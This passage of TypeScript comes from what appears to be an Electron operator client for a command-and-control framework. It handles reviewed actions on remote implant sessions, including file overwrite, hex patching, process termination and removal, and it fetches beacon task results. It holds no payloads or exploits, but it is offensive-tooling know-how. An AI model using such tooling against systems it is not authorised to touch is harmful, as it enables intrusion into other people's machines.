    const selected = this.requireSelectedSession(contentsId, pool);
    this.streams.attach({
      binding: streamOwnerBinding(
        selected.context,
        pool,
        selected.target.ref,
        rendererProcessId,
        rendererFrameToken,
      ),
      attachmentToken: request.attachmentToken,
      port: electronStreamPort(port),
    });
  }

  async prepareSessionDestructiveAction(
    contentsId: number,
    input: PrepareSessionDestructiveActionInput,
  ): Promise<OperationResult<SessionDestructiveActionPreparation>> {
    let admittedContext: WindowContext | undefined;
    const admissionId = randomUUID();
    const workbenchAdmissionId = randomUUID();
    let workbenchAdmissionContext: WindowContext | undefined;
    let uncommittedPickedArtifact: { scope: SessionArtifactScope; handle: string } | undefined;
    try {
      const context = this.requireWindow(contentsId);
      this.pruneSessionPlans(context);
      if (
        context.sessionPlans.size + context.sessionPlanAdmissions.size >=
        MAX_OUTSTANDING_SESSION_ACTION_PLANS
      ) {
        throw new Error("Too many session actions are already awaiting review in this window");
      }
      context.sessionPlanAdmissions.add(admissionId);
      admittedContext = context;
      if (
        input.actionId === "session.filesystem.upload-overwrite" ||
        input.actionId === "session.filesystem.edit-text-overwrite" ||
        input.actionId === "session.filesystem.patch-hex" ||
        input.actionId === "session.process.terminate"
      ) {
        this.admitSessionWorkbenchRequest(
          context,
          workbenchAdmissionId,
          input.actionId === "session.filesystem.upload-overwrite" ||
            input.actionId === "session.filesystem.edit-text-overwrite" ||
            input.actionId === "session.filesystem.patch-hex"
            ? "artifact"
            : "standard",
        );
        workbenchAdmissionContext = context;
      }
      return await this.withPool(contentsId, async (pool, assertBinding) => {
        const selected = this.requireSelectedSession(contentsId, pool);
        const selectedTarget = selected.target.ref;
        const assertSelectedTarget = (): void => {
          assertBinding();
          if (
            !selected.context.activeTarget ||
            !sameTargetRefIdentity(selected.context.activeTarget, selectedTarget)
          ) {
            throw new SessionWorkbenchBoundaryError(
              "The active session changed while the reviewed action was being prepared",
            );
          }
        };
        if (!sessionOperationSupportsPlatform(input.actionId, selected.platform)) {
          throw new Error(`${input.actionId} is unavailable on ${selected.platform} sessions`);
        }
        if (
          input.actionId === "session.filesystem.rm" &&
          input.recursive &&
          recursiveRemovalTargetsSelfOrRoot(input.path, selected.platform)
        ) {
          throw new Error(
            "Recursive removal of a filesystem root, self, or drive-relative path is not allowed",
          );
        }
        const scope = this.bindSessionArtifactScope(selected.context, pool, selected.target);
        let artifactHandle: string | undefined;
        let artifact: SessionDestructiveActionPlan["artifact"];
        let resource: SessionDestructiveActionPlan["resource"];
        let resourceFingerprint: string | undefined;
        let expiresAt: number | undefined;
        if (input.actionId === "session.filesystem.upload-overwrite") {
          const picked = await this.chooseSessionUploadArtifact(contentsId, scope);
          if (picked) uncommittedPickedArtifact = { scope, handle: picked.handle };
          assertSelectedTarget();
          if (!picked) return { status: "canceled" };
          artifactHandle = picked.handle;
          expiresAt = picked.expiresAt;
          artifact = {
            suggestedBasename: picked.suggestedBasename,
            size: picked.size,
            sha256: picked.sha256,
          };
        }
        if (
          input.actionId === "session.filesystem.edit-text-overwrite" ||
          input.actionId === "session.filesystem.patch-hex"
        ) {
          const handle = input.actionId === "session.filesystem.edit-text-overwrite"
            ? input.contentHandle
            : input.patchHandle;
          const metadata = this.sessionArtifacts.metadata(scope, handle);
          const expectedMediaType = input.actionId === "session.filesystem.edit-text-overwrite"
            ? "text/plain"
            : "application/octet-stream";
          if (metadata.mediaType !== expectedMediaType || metadata.size > SESSION_EDITOR_MAX_BYTES) {
            throw new SessionWorkbenchBoundaryError(
              "The staged editor artifact does not match the reviewed edit type",
            );
          }
          const artifactExpiresAt = Date.parse(metadata.expiresAt);
          if (!Number.isSafeInteger(artifactExpiresAt) || artifactExpiresAt <= this.now()) {
            throw new SessionWorkbenchBoundaryError("The staged editor artifact expired before review");
          }
          artifactHandle = metadata.handle;
          expiresAt = Math.min(this.now() + SESSION_ACTION_PLAN_TTL_MS, artifactExpiresAt);
          artifact = {
            suggestedBasename: metadata.suggestedBasename,
            size: metadata.size,
            sha256: metadata.sha256,
          };
        }
        if (input.actionId === "session.process.terminate") {
          let response;
          try {
            response = await pool.client.psSession(selected.target.target.id, true);
          } catch {
            throw new Error("Could not verify the selected process before review");
          }
          assertSelectedTarget();
          if (response.Response?.Err?.trim()) {
            throw new Error("Could not verify the selected process before review");
          }
          const identity = exactSessionProcessIdentity(response.Processes, input.pid);
          if (!identity) throw new Error("The selected process is no longer available for review");
          resource = identity.resource;
          resourceFingerprint = identity.fingerprint;
        }
        const token = randomUUID();
        expiresAt ??= this.now() + SESSION_ACTION_PLAN_TTL_MS;
        const payloadDigest = sessionActionPayloadDigest(input, artifact, resourceFingerprint);
        assertSelectedTarget();
        const plan: InternalSessionActionPlan = {
          token,
          expiresAt,
          contentsId,
          poolKey: pool.key,
          epoch: pool.epoch,
          connectionAttempt: selected.context.connectionAttempt,
          target: selected.target.ref,
          journalTarget: resolvedSessionOperationTarget(selected.context, pool, selected.target),
          input,
          payloadDigest,
          ...(artifactHandle ? { artifactHandle, artifactScope: scope } : {}),
          ...(artifact ? { artifactSha256: artifact.sha256 } : {}),
          ...(resourceFingerprint ? { resourceFingerprint } : {}),
        };
        selected.context.sessionPlans.set(token, plan);
        const expiryTimer = setTimeout(() => {
          const currentContext = this.windows.get(contentsId);
          const currentPlan = currentContext?.sessionPlans.get(token);
          if (currentContext && currentPlan === plan) {
            currentContext.sessionPlans.delete(token);
            if (plan.artifactHandle && plan.artifactScope) {
              try {
                this.sessionArtifacts.remove(plan.artifactScope, plan.artifactHandle);
              } catch {
                // Rebinding may already have revoked the exact artifact.
              }
            }
          }
          currentContext?.sessionPlanTimers.delete(token);
        }, Math.max(0, expiresAt - this.now()));
        expiryTimer.unref?.();
        selected.context.sessionPlanTimers.set(token, expiryTimer);
        uncommittedPickedArtifact = undefined;
        return {
          status: "prepared",
          plan: {
            token,
            expiresAt: new Date(expiresAt).toISOString(),
            payloadDigest,
            action: input,
            target: {
              backend: {
                id: pool.key,
                displayName: selected.context.configName ?? "Current configuration",
              },
              sessionId: selected.target.target.id,
              fingerprint: selected.target.ref.fingerprint,
              name: selected.target.target.name,
              hostname: selected.target.target.hostname,
              os: selected.target.target.os,
            },
            warning: sessionActionWarning(input),
            ...(resource ? { resource } : {}),
            ...(artifact ? { artifact } : {}),
          },
        };
      });
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    } finally {
      if (uncommittedPickedArtifact) {
        try {
          this.sessionArtifacts.remove(
            uncommittedPickedArtifact.scope,
            uncommittedPickedArtifact.handle,
          );
        } catch {
          // A target change may already have revoked and cleared these bytes.
        }
      }
      admittedContext?.sessionPlanAdmissions.delete(admissionId);
      workbenchAdmissionContext?.sessionWorkbenchAdmissions.delete(workbenchAdmissionId);
      this.sessionWorkbenchGlobalAdmissions.delete(workbenchAdmissionId);
    }
  }

  async executeSessionDestructiveActionPlan(
    contentsId: number,
    token: string,
  ): Promise<OperationResult<SessionDestructiveActionOutcome>> {
    let plan: InternalSessionActionPlan | undefined;
    let artifactData: Buffer | undefined;
    let admittedContext: WindowContext | undefined;
    let executionAdmissionId: string | undefined;
    let planConsumed = false;
    let journalEngine: OperationEngine | undefined;
    let journalRequestId: string | undefined;
    let journalFinished = false;
    const outcomeResult = (
      status: SessionDestructiveActionOutcome["status"],
      message: string,
    ): OperationResult<SessionDestructiveActionOutcome> => {
      if (!plan) throw new Error("The reviewed session action plan is unavailable");
      const outcome = sessionActionOutcome(plan, status, message);
      if (journalEngine && journalRequestId && !journalFinished) {
        journalEngine.finishExternal(
          journalRequestId,
          status === "succeeded" ? "completed" : status,
        );
        journalFinished = true;
      }
      return { ok: true, value: outcome };
    };
    try {
      const context = this.requireWindow(contentsId);
      this.pruneSessionPlans(context);
      plan = context.sessionPlans.get(token);
      if (!plan) throw new Error("Unknown, expired, or already-used session action plan");
      executionAdmissionId = randomUUID();
      this.admitSessionWorkbenchRequest(
        context,
        executionAdmissionId,
        plan.artifactHandle ? "artifact" : "standard",
      );
      admittedContext = context;
      context.sessionPlans.delete(token);
      planConsumed = true;
      const planTimer = context.sessionPlanTimers.get(token);
      if (planTimer) clearTimeout(planTimer);
      context.sessionPlanTimers.delete(token);
      const pool = this.pools.get(plan.poolKey);
      if (
        !pool ||
        plan.contentsId !== contentsId ||
        context.poolKey !== plan.poolKey ||
        context.connectionAttempt !== plan.connectionAttempt ||
        pool.epoch !== plan.epoch
      ) {
        return outcomeResult("target-disappeared", "The backend connection changed before dispatch");
      }
      journalEngine = this.requireOperationEngine(contentsId, context, pool);
      const journal = journalEngine.beginExternal(plan.input.actionId, plan.journalTarget);
      journalRequestId = journal.requestId;
      const boundPlan = plan;
      const bindingCurrent = (): boolean =>
        this.windows.get(contentsId) === context &&
        this.pools.get(boundPlan.poolKey) === pool &&
        context.poolKey === boundPlan.poolKey &&
        context.connectionAttempt === boundPlan.connectionAttempt &&
        pool.epoch === boundPlan.epoch;
      try {
        await pool.refreshDomains(["sessions"]);
      } catch {
        return outcomeResult("failed", "Could not refresh the reviewed session before dispatch");
      }
      if (!bindingCurrent()) {
        return outcomeResult("target-disappeared", "The backend connection changed before dispatch");
      }
      if (plan.expiresAt <= this.now()) throw new Error("The reviewed session action plan expired before dispatch");
      assertTargetDomainAuthoritative(pool, "session");
      const current = pool.targetStore.revalidateTargetRef(plan.target, pool.epoch);
      if (!current || current.target.mode !== "session") {
        return outcomeResult("target-disappeared", "The reviewed session is no longer available");
      }
      if (!context.activeTarget || !sameTargetRefIdentity(context.activeTarget, plan.target)) {
        return outcomeResult("target-disappeared", "The active session changed before dispatch");
      }
      const platform = sessionPlatform(current.target.os);
      if (!sessionOperationSupportsPlatform(plan.input.actionId, platform)) {
        return outcomeResult("failed", `${plan.input.actionId} is unavailable on ${platform} sessions`);
      }
      if (plan.input.actionId === "session.process.terminate") {
        let processes;
        try {
          processes = await pool.client.psSession(current.target.id, true);
        } catch {
          return outcomeResult("failed", "Could not revalidate the reviewed process before dispatch");
        }
        if (
          !bindingCurrent() ||
          !context.activeTarget ||
          !sameTargetRefIdentity(context.activeTarget, plan.target) ||
          !pool.targetStore.revalidateTargetRef(plan.target, pool.epoch)
        ) {
          return outcomeResult("target-disappeared", "The active session changed before dispatch");
        }
        if (processes.Response?.Err?.trim()) {
          return outcomeResult("failed", "Could not revalidate the reviewed process before dispatch");
        }
        const identity = exactSessionProcessIdentity(processes.Processes, plan.input.pid);
        if (!identity || !plan.resourceFingerprint || identity.fingerprint !== plan.resourceFingerprint) {
          return outcomeResult("failed", "The reviewed process identity changed before dispatch");
        }
      }
      if (isSessionFileEditAction(plan.input)) {
        try {
          await verifySessionFileEditPrecondition(
            pool.client,
            current.target.id,
            plan.input.remotePath,
            plan.input.expectedSha256,
          );
        } catch (error) {
          return outcomeResult(
            "failed",
            error instanceof SessionFileEditConflictError
              ? error.message
              : error instanceof SessionFileEditPreflightError
                ? error.message
                : "The remote file could not be verified before saving",
          );
        }
        if (
          !bindingCurrent() ||
          !context.activeTarget ||
          !sameTargetRefIdentity(context.activeTarget, plan.target) ||
          !pool.targetStore.revalidateTargetRef(plan.target, pool.epoch)
        ) {
          return outcomeResult("target-disappeared", "The active session changed before edit dispatch");
        }
      }
      if (plan.expiresAt <= this.now()) throw new Error("The reviewed session action plan expired before dispatch");
      if (plan.artifactHandle && plan.artifactScope) {
        let consumed;
        try {
          consumed = this.sessionArtifacts.consume(plan.artifactScope, plan.artifactHandle);
        } catch (error) {
          if (isSessionFileEditAction(plan.input)) {
            return outcomeResult("failed", "The staged editor artifact is no longer available");
          }
          throw error;
        }
        artifactData = consumed.data;
        if (!plan.artifactSha256 || consumed.metadata.sha256 !== plan.artifactSha256) {
          if (isSessionFileEditAction(plan.input)) {
            return outcomeResult("failed", "The staged editor artifact no longer matches the reviewed payload");
          }
          throw new Error("The reviewed upload bytes no longer match the authorized payload");
        }
        if (isSessionFileEditAction(plan.input)) {
          const expectedMediaType = plan.input.actionId === "session.filesystem.edit-text-overwrite"
            ? "text/plain"
            : "application/octet-stream";
          const actualSha256 = createHash("sha256").update(artifactData).digest("hex");
          if (
            artifactData.length > SESSION_EDITOR_MAX_BYTES ||
            consumed.metadata.size !== artifactData.length ||
            consumed.metadata.mediaType !== expectedMediaType ||
            actualSha256 !== plan.artifactSha256
          ) {
            return outcomeResult("failed", "The staged editor artifact no longer matches the reviewed payload");
          }
        }
      }
      if (isSessionFileEditAction(plan.input) && !artifactData) {
        return outcomeResult("failed", "The staged editor artifact is no longer available");
      }

      let dispatchStarted = false;
      try {
        const submitted = journalEngine.markExternalSubmitted(journalRequestId);
        if (submitted.state !== "running") {
          throw new SessionWorkbenchBoundaryError(
            "The reviewed action no longer belongs to the active target",
          );
        }
        dispatchStarted = true;
        await executeReviewedSessionAction(pool.client, current.target.id, plan.input, artifactData);
        if (!bindingCurrent()) {
          return outcomeResult(
            "outcome-unknown",
            "The backend connection changed before the exact action response could be recorded",
          );
        }
        let completed = journalEngine.finishExternal(journalRequestId, "completed");
        if (completed.state === "outcome-unknown") {
          completed = journalEngine.resolveExternalOutcome(journalRequestId, "completed");
        }
        journalFinished = completed.state === "completed";
        if (this.pools.get(pool.key) === pool) await pool.refreshDomains(["sessions"]).catch(() => undefined);
        return outcomeResult("succeeded", "The reviewed action completed");
      } catch (error) {
        if (error instanceof SessionReviewedActionTargetRejectedError) {
          let failed = journalEngine.finishExternal(journalRequestId, "failed");
          if (failed.state === "outcome-unknown" && bindingCurrent()) {
            failed = journalEngine.resolveExternalOutcome(journalRequestId, "failed");
          }
          journalFinished = failed.state === "failed";
          return outcomeResult("failed", SESSION_REVIEWED_ACTION_TARGET_REJECTED_MESSAGE);
        }
        return outcomeResult(
          dispatchStarted ? "outcome-unknown" : "failed",
          dispatchStarted
            ? "The action was dispatched, but its outcome could not be confirmed"
            : "The reviewed action could not be submitted",
        );
      }
    } catch (error) {
      if (journalEngine && journalRequestId && !journalFinished) {
        journalEngine.finishExternal(journalRequestId, "failed");
        journalFinished = true;
      }
      return { ok: false, error: errorMessage(error) };
    } finally {
      artifactData?.fill(0);
      if (planConsumed && plan?.artifactHandle && plan.artifactScope) {
        try {
          this.sessionArtifacts.remove(plan.artifactScope, plan.artifactHandle);
        } catch {
          // Rebinding the window already revokes and clears stale plan bytes.
        }
      }
      if (executionAdmissionId) {
        admittedContext?.sessionWorkbenchAdmissions.delete(executionAdmissionId);
        this.sessionWorkbenchGlobalAdmissions.delete(executionAdmissionId);
      }
    }
  }

  private admitSessionWorkbenchRequest(
    context: WindowContext,
    admissionId: string,
    kind: "standard" | "artifact",
  ): void {
    if (context.sessionWorkbenchAdmissions.size >= MAX_WINDOW_SESSION_WORKBENCH_REQUESTS) {
      throw new Error("Too many session workbench requests are already running in this window");
    }
    if (this.sessionWorkbenchGlobalAdmissions.size >= MAX_GLOBAL_SESSION_WORKBENCH_REQUESTS) {
      throw new Error("The global session workbench request capacity is currently full");
    }
    if (
      kind === "artifact" &&
      [...context.sessionWorkbenchAdmissions.values()].filter((candidate) => candidate === "artifact").length >=
        MAX_WINDOW_SESSION_ARTIFACT_REQUESTS
    ) {
      throw new Error("Too many session artifact requests are already running in this window");
    }
    if (
      kind === "artifact" &&
      [...this.sessionWorkbenchGlobalAdmissions.values()].filter((candidate) => candidate === "artifact").length >=
        MAX_GLOBAL_SESSION_ARTIFACT_REQUESTS
    ) {
      throw new Error("The global session artifact request capacity is currently full");
    }
    context.sessionWorkbenchAdmissions.set(admissionId, kind);
    this.sessionWorkbenchGlobalAdmissions.set(admissionId, kind);
  }

  private requireSelectedSession(
    contentsId: number,
    pool: BackendPool,
  ): { context: WindowContext; target: RevalidatedTarget; platform: SessionTargetPlatform } {
    const context = this.requireWindow(contentsId);
    if (!context.activeTarget || context.activeTarget.mode !== "session") {
      throw new Error("Select an active session before using the session workbench");
    }
    assertTargetDomainAuthoritative(pool, "session");
    const target = pool.targetStore.revalidateTargetRef(context.activeTarget, pool.epoch);
    if (!target || target.target.mode !== "session") {
      throw new Error("The selected session is no longer available");
    }
    if (target.target.liveness !== "active") throw new Error("The selected session is no longer active");
    return { context, target, platform: sessionPlatform(target.target.os) };
  }

  private requireSelectedExecutionTarget(
    contentsId: number,
    pool: BackendPool,
  ): { context: WindowContext; target: RevalidatedTarget } {
    const context = this.requireWindow(contentsId);
    const selectedRef = context.activeTarget;
    if (!selectedRef) throw new Error("Select a target before using the execution workbench");
    assertTargetDomainAuthoritative(pool, selectedRef.mode);
    const target = pool.targetStore.revalidateTargetRef(selectedRef, pool.epoch);
    if (!target) throw new Error("The selected target is no longer available");
    if (target.target.mode === "session" && target.target.liveness !== "active") {
      throw new Error("The selected session is no longer active");
    }
    return { context, target };
  }

  private bindExecutionArtifactOwner(context: WindowContext, pool: BackendPool): void {
    this.executionArtifacts.bindOwner({
      ownerWindowId: context.contentsId,
      backendId: pool.key,
      backendEpoch: pool.epoch,
      connectionIncarnation: context.connectionAttempt,
    });
  }

  private executionArtifactScope(
    context: WindowContext,
    pool: BackendPool,
    target: RevalidatedTarget,
    operationId: string,
    role: string,
  ): ExecutionArtifactScope {
    this.bindExecutionArtifactOwner(context, pool);
    return {
      ownerWindowId: context.contentsId,
      backendId: pool.key,
      backendEpoch: pool.epoch,
      connectionIncarnation: context.connectionAttempt,
      target: { ...target.ref },
      operationId,
      role,
    };
  }

  private bindSessionArtifactScope(
    context: WindowContext,
    pool: BackendPool,
    target: RevalidatedTarget,
  ): SessionArtifactScope {
    const scope: SessionArtifactScope = {
      ownerWindowId: context.contentsId,
      backendId: pool.key,
      backendEpoch: pool.epoch,
      connectionIncarnation: context.connectionAttempt,
      sessionId: target.target.id,
      sessionFingerprint: target.ref.fingerprint,
    };
    this.sessionArtifacts.bind(scope);
    return scope;
  }

  /** Revoke capabilities bound to the window's previous exact session identity. */
  private revokeSessionTargetCapabilities(context: WindowContext): void {
    context.sessionPlans.clear();
    for (const timer of context.sessionPlanTimers.values()) clearTimeout(timer);
    context.sessionPlanTimers.clear();
    this.sessionArtifacts.removeOwner(context.contentsId);
  }

  /** Revoke every M4 plan, secret, and result bound to this exact window authority. */
  private revokeExecutionState(context: WindowContext): void {
    for (const token of [...context.executionPlans.keys()]) this.revokeExecutionPlan(context, token);
    context.executionResults.clear();
    for (const timer of context.executionResultTimers.values()) clearTimeout(timer);
    context.executionResultTimers.clear();
    this.executionArtifacts.removeOwner(context.contentsId);
    if (context.dotNetFileTimer) clearTimeout(context.dotNetFileTimer);
    delete context.dotNetFileTimer;
    context.dotNetFile?.data.fill(0);
    delete context.dotNetFile;
    context.dotNetFileRevision += 1;
    if (context.bofArgumentFileTimer) clearTimeout(context.bofArgumentFileTimer);
    delete context.bofArgumentFileTimer;
    for (const file of context.bofArgumentFiles.values()) file.data.fill(0);
    context.bofArgumentFiles.clear();
    delete context.bofLocalPackage;
    context.bofDirectorySelectionRevision += 1;
  }

  private admitExecutionRequest(context: WindowContext, admissionId: string): void {
    if (context.executionAdmissions.size >= MAX_WINDOW_EXECUTION_REQUESTS) {
      throw new Error("Too many execution requests are already running in this window");
    }
    if (this.executionGlobalAdmissions.size >= MAX_GLOBAL_EXECUTION_REQUESTS) {
      throw new Error("The global execution request capacity is currently full");
    }
    context.executionAdmissions.add(admissionId);
    this.executionGlobalAdmissions.add(admissionId);
  }

  private pruneExecutionPlans(context: WindowContext): void {
    const now = this.now();
    for (const [token, plan] of context.executionPlans) {
      if (plan.expiresAt <= now) this.revokeExecutionPlan(context, token);
    }
  }

  private takeExecutionPlan(context: WindowContext, token: string): InternalExecutionPlan {
    this.pruneExecutionPlans(context);
    const plan = context.executionPlans.get(token);
    if (!plan || plan.contentsId !== context.contentsId || plan.expiresAt <= this.now()) {
      if (plan) this.revokeExecutionPlan(context, token);
      throw new Error("The execution review is unavailable or expired");
    }
    context.executionPlans.delete(token);
    const timer = context.executionPlanTimers.get(token);
    if (timer) clearTimeout(timer);
    context.executionPlanTimers.delete(token);
    return plan;
  }

  private revokeExecutionPlan(context: WindowContext, token: string): void {
    const plan = context.executionPlans.get(token);
    context.executionPlans.delete(token);
    const timer = context.executionPlanTimers.get(token);
    if (timer) clearTimeout(timer);
    context.executionPlanTimers.delete(token);
    if (!plan) return;
    clearExecutionDraftSecrets(plan.draft);
    for (const artifact of plan.artifacts) {
      try { this.executionArtifacts.remove(artifact.scope, artifact.handle); } catch { /* already consumed */ }
    }
  }

  private retainExecutionResult(
    context: WindowContext,
    pool: BackendPool,
    target: RevalidatedTarget,
    value: ExecutionActionResult,
    streams: Partial<Record<"stdout" | "stderr", { data: Buffer; truncated: boolean }>> = {},
    processWaited?: boolean,
  ): ExecutionActionResult {
    this.pruneExecutionResults(context);
    const historyKey = value.operationId === "execution.process" && target.target.mode === "session"
      ? processExecutionHistoryKey(pool.key, pool.epoch, target.ref)
      : undefined;
    const dotNetHistoryKey = value.operationId === "execution.assembly"
      ? processExecutionHistoryKey(pool.key, pool.epoch, target.ref)
      : undefined;
    const historyStdout = historyKey && streams.stdout ? Uint8Array.from(streams.stdout.data) : undefined;
    const historyStderr = historyKey && streams.stderr ? Uint8Array.from(streams.stderr.data) : undefined;
    const dotNetHistoryStdout = dotNetHistoryKey && streams.stdout ? Uint8Array.from(streams.stdout.data) : undefined;
    const dotNetHistoryStderr = dotNetHistoryKey && streams.stderr ? Uint8Array.from(streams.stderr.data) : undefined;
    processWaited ??= context.executionResults.get(value.requestId)?.processWaited;
    if (context.executionResults.has(value.requestId)) {
      this.revokeExecutionResult(context, value.requestId);
    }
    while (context.executionResults.size >= MAX_WINDOW_EXECUTION_RESULTS) {
      const oldest = [...context.executionResults.entries()]
        .sort((left, right) => left[1].expiresAt - right[1].expiresAt)[0];
      if (!oldest) break;
      this.revokeExecutionResult(context, oldest[0]);
    }
    const output: InternalExecutionResult["output"] = {};
    const publicOutput: NonNullable<ExecutionActionResult["output"]> = [];
    const created: InternalExecutionArtifact[] = [];
    let outputRetained = true;
    try {
      const store = (
        stream: "stdout" | "stderr" | "combined",
        data: Buffer,
        truncated: boolean,
      ): void => {
        const scope = this.executionArtifactScope(
          context,
          pool,
          target,
          value.operationId,
          stream,
        );
        const stored = this.executionArtifacts.storeResult({
          scope,
          data,
          mediaType: "application/octet-stream",
          suggestedBasename: safeArtifactFileName(
            `${value.operationId.replaceAll(".", "-")}-${stream}.bin`,
          ),
        });
        const artifact: InternalExecutionArtifact = { role: stream, scope, handle: stored.handle };
        created.push(artifact);
        output[stream] = artifact;
        publicOutput.push({
          handle: stored.handle,
          suggestedFileName: stored.suggestedBasename,
          mediaType: stored.mediaType,
          size: stored.size,
          expiresAt: stored.expiresAt,
          stream,
          truncated,
        });
      };
      if (streams.stdout) store("stdout", streams.stdout.data, streams.stdout.truncated);
      if (streams.stderr) store("stderr", streams.stderr.data, streams.stderr.truncated);
      if (streams.stdout && streams.stderr) {
        const combined = Buffer.concat([streams.stdout.data, streams.stderr.data]);
        try {
          store(
            "combined",
            combined,
            streams.stdout.truncated || streams.stderr.truncated,
          );
        } finally {
          combined.fill(0);
        }
      }
    } catch {
      outputRetained = false;
      for (const artifact of created) {
        try { this.executionArtifacts.remove(artifact.scope, artifact.handle); } catch { /* already revoked */ }
      }
      for (const stream of ["stdout", "stderr", "combined"] as const) delete output[stream];
      publicOutput.length = 0;
    } finally {
      streams.stdout?.data.fill(0);
      streams.stderr?.data.fill(0);
    }

    const expiresAt = this.now() + EXECUTION_RESULT_TTL_MS;
    const retainedValue: ExecutionActionResult = Object.freeze({
      ...value,
      ...(!outputRetained && (streams.stdout || streams.stderr)
        ? { message: `${value.message} Captured output could not be retained.` }
        : {}),
      ...(publicOutput.length > 0 ? { output: publicOutput.map((item) => Object.freeze({ ...item })) } : {}),
    });
    const retained: InternalExecutionResult = {
      value: retainedValue,
      ...(processWaited ? { processWaited } : {}),
      expiresAt,
      output,
      poolKey: pool.key,
      epoch: pool.epoch,
      connectionAttempt: context.connectionAttempt,
      target: { ...target.ref },
    };
    context.executionResults.set(value.requestId, retained);
    const timer = setTimeout(() => {
      const current = this.windows.get(context.contentsId);
      if (current?.executionResults.get(value.requestId) === retained) {
        this.revokeExecutionResult(current, value.requestId);
      }
    }, EXECUTION_RESULT_TTL_MS);
    timer.unref?.();
    context.executionResultTimers.set(value.requestId, timer);
    if (historyKey) {
      try {
        this.updateProcessExecutionHistory(historyKey, value.requestId, {
          state: retainedValue.state,
          result: retainedValue,
          ...(outputRetained && historyStdout
            ? { stdout: { data: historyStdout, truncated: streams.stdout?.truncated === true } }
            : {}),
          ...(outputRetained && historyStderr
            ? { stderr: { data: historyStderr, truncated: streams.stderr?.truncated === true } }
            : {}),
          ...(outputRetained ? {} : { outputError: "Captured output could not be retained." }),
        });
      } finally {
        historyStdout?.fill(0);
        historyStderr?.fill(0);
      }
    }
    if (dotNetHistoryKey) {
      try {
        this.updateDotNetExecutionHistory(dotNetHistoryKey, value.requestId, {
          state: retainedValue.state,
          result: retainedValue,
          ...(outputRetained && dotNetHistoryStdout
            ? { stdout: { data: dotNetHistoryStdout, truncated: streams.stdout?.truncated === true } }
            : {}),
          ...(outputRetained && dotNetHistoryStderr
            ? { stderr: { data: dotNetHistoryStderr, truncated: streams.stderr?.truncated === true } }
            : {}),
          ...(outputRetained ? {} : { outputError: "Captured output could not be retained." }),
        });
      } finally {
        dotNetHistoryStdout?.fill(0);
        dotNetHistoryStderr?.fill(0);
      }
    }
    return cloneExecutionActionResult(retainedValue);
  }

  private async refreshExecutionBeaconTask(input: {
    context: WindowContext;
    pool: BackendPool;
    target: RevalidatedTarget;
    engine: OperationEngine;
    taskId: string;
    operationId: ExecutionOperationId;
    expectedRequestId?: string;
    processWaited?: boolean;
    readInput?: RunExecutionReadInput;
    assertCurrent: () => void;
  }): Promise<RefreshedExecutionBeaconTask> {
    const {
      context,
      pool,
      target,
      engine,
      taskId,
      operationId,
      expectedRequestId,
      processWaited,
      readInput,
      assertCurrent,
    } = input;
    if (target.target.mode !== "beacon") {
      throw new Error("The selected target cannot refresh a beacon execution task");
    }
    const operation = engine.findByTask(taskId, target.target.id);
    const factBoundRead = !operation && readInput?.taskId === taskId &&
      isExecutionReadOperationId(operationId) &&
      pool.executionTaskFact(taskId, target.ref)?.operationId === operationId;
    if (
      operation
        ? operation.operationId !== operationId ||
          (expectedRequestId !== undefined && operation.requestId !== expectedRequestId)
        : expectedRequestId !== undefined || !factBoundRead
    ) throw new Error("The execution result is unavailable for the current target");

    // A second window can page an exact, pool-correlated read task without
    // claiming or changing the submitting window's operation journal.
    const markUnknown = (): void => {
      if (operation) engine.markTaskOutcomeUnknown(taskId, target.target.id);
    };

    const resolveOwnership = this.taskOwnershipResolver(context);
    try {
      await pool.beaconTasks.refresh(
        target.target.id,
        [taskId, ...localTaskIdsForBeacon(context, target.target.id)],
        [taskId, ...pool.recoverableTaskIdsForBeacon(target.target.id)],
      );
    } catch {
      markUnknown();
      return { state: "outcome-unknown" };
    }
    assertCurrent();
    let summary: BeaconTaskSummary;
    try {
      summary = pool.beaconTasks.task(target.target.id, taskId, resolveOwnership);
    } catch {
      markUnknown();
      return { state: "outcome-unknown" };
    }
    if (operation && summary.localRequestId !== operation.requestId) {
      markUnknown();
      return { state: "outcome-unknown" };
    }
    switch (summary.state) {
      case "pending":
      case "sent":
        if (operation && operation.state !== "cancel-requested") {
          await engine.reconcileTask({ taskId, beaconId: target.target.id, state: summary.state });
        }
        return { state: "pending" };
      case "canceled":
        if (operation) await engine.reconcileTask({ taskId, beaconId: target.target.id, state: "canceled" });
        return { state: "canceled" };
      case "failed":
        if (operation) await engine.reconcileTask({ taskId, beaconId: target.target.id, state: "failed" });
        return { state: "failed" };
      case "unknown":
        markUnknown();
        return { state: "outcome-unknown" };
      case "completed":
        break;
    }

    let content: clientpb.BeaconTask | undefined;
    let decoded: DecodedExecutionBeaconTask | undefined;
    let decodedTransferred = false;
    try {
      content = await pool.client.fetchBeaconTask(taskId);
      assertCurrent();
      if (
        content.ID !== taskId ||
        content.BeaconID !== target.target.id ||
        content.State.trim().toLowerCase() !== "completed" ||
        content.Description !== summary.description
      ) throw new ExecutionBeaconTaskDecodeError("description-mismatch");
      decoded = decodeExecutionBeaconTask({
        operationId,
        description: content.Description,
        response: content.Response,
        ...(readInput ? { readInput } : {}),
        ...(processWaited ? { processWaited } : {}),
      });
      assertCurrent();
      if (operation) await engine.reconcileTask({ taskId, beaconId: target.target.id, state: "completed" });
      decodedTransferred = true;
      return { state: "decoded", decoded };
    } catch (error) {
      if (!decodedTransferred && decoded?.kind === "action") {
        decoded.value.stdout?.fill(0);
        decoded.value.stderr?.fill(0);
      }
      if (error instanceof ExecutionBeaconTaskDecodeError && error.reason === "invalid-read-input") {
        throw error;
      }
      if (error instanceof ExecutionRemoteRejectedError) {
        if (operation) await engine.reconcileTask({ taskId, beaconId: target.target.id, state: "failed" });
        return { state: "failed" };
      }
      markUnknown();
      return { state: "outcome-unknown" };
    } finally {
      content?.Request.fill(0);
      content?.Response.fill(0);
    }
  }

  private pruneExecutionResults(context: WindowContext): void {
    const now = this.now();
    for (const [requestId, result] of context.executionResults) {
      if (result.expiresAt <= now) this.revokeExecutionResult(context, requestId);
    }
  }

  private requireExecutionResult(context: WindowContext, requestId: string): InternalExecutionResult {
    this.pruneExecutionResults(context);
    const result = context.executionResults.get(requestId);
    if (!result) throw new Error("The execution result is unavailable or expired");
    return result;
  }

  private revokeExecutionResult(context: WindowContext, requestId: string): void {
    const result = context.executionResults.get(requestId);
    context.executionResults.delete(requestId);
    const timer = context.executionResultTimers.get(requestId);
    if (timer) clearTimeout(timer);
    context.executionResultTimers.delete(requestId);
    if (!result) return;
    for (const artifact of Object.values(result.output)) {
      if (!artifact) continue;
